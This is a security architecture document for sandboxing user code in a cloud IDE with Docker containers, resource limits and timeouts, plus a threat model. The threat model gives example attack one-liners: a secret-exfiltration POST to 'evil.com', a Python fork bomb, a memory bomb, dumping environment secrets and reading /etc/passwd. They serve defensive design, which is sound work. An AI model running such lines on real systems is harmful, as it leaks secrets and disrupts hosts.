# Secure Code Execution Architecture

## Core Security Assumption

> **Every piece of user-submitted code is treated as actively malicious.**

This is not paranoia — it's the correct engineering baseline for any system that executes arbitrary user code. A Cloud IDE cannot assume users submit only benign programs. Malicious code is a first-class threat model.

---

## Current Situation and Why It's Dangerous

The current system calls `child_process.spawn(command, args)` directly on the Express server process. This means:

- User code inherits the server's Unix user (likely the same UID that owns Node.js)
- It can read `/proc/self/environ` to get JWT_SECRET and GEMINI_API_KEY
- It can read all files accessible to the Node.js process
- It can make outbound HTTP requests (exfiltrate data, DDoS third parties)
- It can call `process.exit()` to crash the server
- It can fork-bomb the host
- It can write to `/tmp` and fill the disk
- It can run indefinitely with no timeout

None of these require sophisticated attacks — they are trivial one-liners.

---

## Target Execution Security Model

### Layer 1: Container Isolation (Docker)

Every execution runs in its own short-lived Docker container. The container:

- **Has no access to host filesystem** — only a read-only tmpfs mount for code
- **Runs as a non-root, non-privileged user** inside the container
- **Has a dropped capability set** — no `NET_ADMIN`, no `SYS_ADMIN`, etc.
- **Has no network access** (`--network=none`) for general code execution
- **Is automatically destroyed** after execution completes (`--rm`)

```bash
docker run \
  --rm \                                     # Auto-remove on exit
  --network=none \                           # No network access
  --memory=128m \                            # 128MB RAM limit
  --memory-swap=128m \                       # Disable swap
  --cpus=0.5 \                              # 0.5 CPU cores max
  --pids-limit=50 \                          # Max 50 processes (prevents fork bombs)
  --read-only \                              # Read-only root filesystem
  --tmpfs /tmp:rw,size=10m,mode=1777 \      # Writable /tmp, max 10MB
  --user=1000:1000 \                         # Non-root user inside container
  --cap-drop=ALL \                           # Drop all Linux capabilities
  --security-opt=no-new-privileges \         # Prevent privilege escalation
  code-runner:python3                        # Dedicated language image
  python3 /tmp/solution.py                   # Run user code from tmpfs
```

### Layer 2: Resource Limits (cgroups via Docker)

| Resource | Limit | Why |
|---|---|---|
| Memory | 128MB | Prevents OOM attacks on host |
| Swap | 0 (equal to memory limit) | Prevents swap exhaustion |
| CPU | 0.5 cores | Prevents CPU monopolization |
| PIDs | 50 | Prevents fork bombs |
| Disk writes | 10MB tmpfs | Prevents disk fill |
| Network | None | Prevents data exfiltration / DDoS amplification |
| Wall-clock time | 15 seconds | Prevents infinite loops |

### Layer 3: Wall-Clock Timeout (API Level)

Even with cgroups, the API server must enforce its own timeout as a safety net:

```javascript
const EXECUTION_TIMEOUT_MS = 15_000; // 15 seconds

const runWithTimeout = (containerId) => {
  return new Promise((resolve, reject) => {
    const timer = setTimeout(async () => {
      await docker.getContainer(containerId).kill();
      reject({ type: 'TIMEOUT', message: 'Execution timed out after 15 seconds' });
    }, EXECUTION_TIMEOUT_MS);

    // Clear timer if process ends naturally
    container.on('exit', (code) => {
      clearTimeout(timer);
      resolve(code);
    });
  });
};
```

### Layer 4: Language-Specific Docker Images

Rather than one image with all runtimes, use small focused images:

```
code-runner:python3   → python:3.12-alpine  + non-root user setup
code-runner:node      → node:20-alpine      + non-root user setup
code-runner:java      → eclipse-temurin:21-alpine
code-runner:gcc       → gcc:13-alpine       + g++ + build tools
```

Each image:
- Has no unnecessary packages
- Has a pre-created `runner` user (UID 1000)
- Has no shell access (code runs directly, not via sh -c)
- Is pinned to a specific version (not `latest`)

### Layer 5: No Host Filesystem Access

User code is injected into the container via stdin pipe or tmpfs — never via a volume mount to the host:

```javascript
// WRONG (never do this):
docker run -v /host/user/code:/code python3 /code/main.py

// CORRECT: Write code to container's tmpfs via stdin pipe
const container = await docker.createContainer({ ... });
await container.start();
const exec = await container.exec({ Cmd: ['python3', '/dev/stdin'] });
exec.stdin.write(userCode);
exec.stdin.end();
```

For interactive/terminal sessions where a workspace needs to persist, use a **named Docker volume per user** — not a host directory mount:
```bash
docker volume create user-workspace-{userId}
docker run -v user-workspace-{userId}:/workspace ...
```

---

## Threat Model: Attack Vectors and Mitigations

### 1. Host Filesystem Access
**Attack**: `open('/etc/passwd', 'r').read()` or `fs.readFileSync('/etc/hosts')`  
**Mitigation**: `--read-only` root FS + no host volume mount. `/tmp` is tmpfs, isolated to the container.

### 2. Environment Variable Exfiltration
**Attack**: `print(os.environ)` — would dump JWT_SECRET, GEMINI_API_KEY, etc.  
**Mitigation**: Docker containers do not inherit the host's environment variables by default. The container image has no sensitive env vars. The `--env` flag is never used to pass secrets to execution containers.

### 3. Fork Bomb
**Attack**: `import os; [os.fork() for _ in range(999999)]`  
**Mitigation**: `--pids-limit=50` enforces a hard cap on the number of processes inside the container at the kernel level.

### 4. Memory Exhaustion
**Attack**: `x = [0] * (10**9)` — allocate gigabytes  
**Mitigation**: `--memory=128m --memory-swap=128m`. When the limit is hit, processes are killed by the kernel OOM killer, contained within Docker's cgroup.

### 5. CPU Monopolization
**Attack**: `while True: pass`  
**Mitigation**: `--cpus=0.5` limits CPU usage. Combined with the 15-second wall-clock timeout, this becomes the fallback.

### 6. Network Access (Data Exfiltration / DDoS Amplification)
**Attack**: `import requests; requests.post('evil.com', data=secret_data)`  
**Mitigation**: `--network=none`. The container has no network interface other than loopback.

### 7. Disk Exhaustion
**Attack**: Write a loop that fills `/tmp` with gigabytes  
**Mitigation**: `--tmpfs /tmp:rw,size=10m`. The tmpfs has a 10MB hard size limit enforced by the kernel.

### 8. Privilege Escalation
**Attack**: Exploit a kernel vulnerability to gain root  
**Mitigation**: `--cap-drop=ALL`, `--security-opt=no-new-privileges`, and running as UID 1000 inside the container. Even if a container breakout occurred, the process is running as non-root.

### 9. Container Breakout
**Attack**: Exploit Docker daemon vulnerability  
**Mitigation**: Keep Docker updated. Run the Docker daemon in rootless mode for additional security. For production, consider gVisor or Kata Containers as the container runtime for stronger isolation.

### 10. Infinite Loop / Timeout Evasion
**Attack**: Code that hangs indefinitely, evading simple timeouts  
**Mitigation**: Both the API-level `setTimeout` (kills the Docker container) and Docker's own `--stop-timeout` ensure cleanup. The container is always destroyed.

---

## Execution Service Design

### Short Execution (< 15 seconds)

```
Client POST /api/execute/run
         │
         ▼
  Validate auth (JWT)
         │
         ▼
  Check rate limit (Redis)
  - Max 20 executions/hour per user
         │
         ▼
  Validate input:
  - language in allowlist
  - code length < 100KB
  - stdin < 10KB
         │
         ▼
  Generate executionId (UUID)
  Store in Redis: exec:{id} = { userId, status: "queued" }
         │
         ▼
  Return 202 { executionId }
  (client subscribes to socket room: `exec:{executionId}`)
         │
         ▼
  Spawn Docker container (async):
  - Write code to container stdin or tmpfs
  - Attach stdout/stderr streams
         │
    ┌────┴────┐
    │         │
  chunks    exit/timeout
    │         │
    ▼         ▼
  socket.emit  socket.emit
  exec:output  exec:done
  to room      { exitCode, duration }
               Update Redis: status = "done"
               Save to MongoDB: execution_logs
               Destroy container (--rm)
```

### Long-Running / Interactive Execution (Terminal Mode)

Handled separately by the Terminal system (see `realtime-execution.md`).

---

## Container Image Build

```dockerfile
# code-runner/python3.Dockerfile
FROM python:3.12-alpine

# Create non-root user
RUN addgroup -S runner && adduser -S -G runner runner

# Install nothing else — minimal image
USER runner
WORKDIR /home/runner

# No CMD — the container is always started with explicit command
```

Build and tag all images during deployment:
```bash
docker build -f code-runner/python3.Dockerfile -t code-runner:python3 .
docker build -f code-runner/node.Dockerfile -t code-runner:node .
# etc.
```

---

## What Happens on Worker Crash / Cleanup Failure

If the API server crashes mid-execution:
1. Docker containers continue running (Docker daemon is separate from the Node process)
2. On restart, the API server reads active execution records from Redis
3. For each record with status `running` and `startedAt` older than 2× the timeout, call `docker kill`
4. Mark these executions as `CRASHED` in MongoDB
5. Emit `exec:error` if the client reconnects

This recovery pattern ensures **no orphaned containers accumulate** even across server restarts.

---

## Security Summary

| Threat | Defense | Layer |
|---|---|---|
| Read host files | `--read-only` + no volume mount | Docker |
| Steal env vars | No env vars in container | Docker |
| Fork bomb | `--pids-limit=50` | cgroups |
| Memory bomb | `--memory=128m` | cgroups |
| CPU drain | `--cpus=0.5` + 15s timeout | cgroups + API |
| Network abuse | `--network=none` | Docker |
| Disk fill | `--tmpfs /tmp:size=10m` | tmpfs |
| Privilege escalation | `--cap-drop=ALL` + non-root user | Linux capabilities |
| Anonymous execution | Auth middleware on all endpoints | API |
| API abuse | Rate limiting per user + per IP | Redis |
| Infinite loop | Wall-clock timeout + container kill | API + Docker |
